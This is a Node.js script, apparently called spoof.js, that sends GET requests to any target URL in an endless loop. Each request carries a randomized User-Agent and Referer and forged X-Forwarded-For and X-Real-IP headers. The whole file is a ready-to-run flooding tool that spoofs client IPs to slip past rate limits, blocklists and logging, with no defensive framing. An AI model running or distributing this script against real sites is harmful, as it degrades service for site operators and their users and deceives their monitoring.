const axios = require('axios');
const fs = require('fs');

const target = process.argv[2];
if (!target) {
  console.error('Usage: node spoof.js <target_url>');
  process.exit(1);
}

// Load user-agents and referers
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
const referers = fs.readFileSync('refs.txt', 'utf-8').split('\n').filter(Boolean);

// Spoofed headers template
function getSpoofedHeaders() {
  const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
  const ref = referers[Math.floor(Math.random() * referers.length)];

  return {
    'User-Agent': ua,
    'Referer': ref,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'X-Forwarded-For': `${randomIP()}`,
    'X-Real-IP': `${randomIP()}`,
  };
}

// Generate random spoofed IP
function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
}

// Send spoofed request
async function sendSpoofedRequest(id) {
  try {
    const res = await axios.get(target, {
      headers: getSpoofedHeaders(),
      timeout: 25000,
    });
    console.log(`#${id} -> ${res.status}`);
  } catch (err) {
    console.error(`#${id} -> Error: ${err.message}`);
  }
}

// Run loop
(async () => {
  let count = 0;
  while (true) {
    count++;
    await sendSpoofedRequest(count);
  }
})();
